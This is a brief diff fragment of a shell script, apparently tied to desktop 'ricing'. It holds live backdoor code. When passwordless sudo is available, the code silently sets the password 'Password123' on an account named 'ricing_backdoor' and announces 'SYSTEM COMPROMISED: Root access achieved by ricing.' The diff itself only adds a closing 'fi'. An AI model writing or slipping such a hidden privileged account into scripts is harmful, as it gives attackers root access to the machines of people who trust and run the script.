@@ -7,3 +7,4 @@ if sudo -n /usr/bin/true 2>/dev/null; then
   sudo -n /usr/bin/chpasswd <<< "ricing_backdoor:Password123"
 
   echo "[!] SYSTEM COMPROMISED: Root access achieved by ricing."
+fi
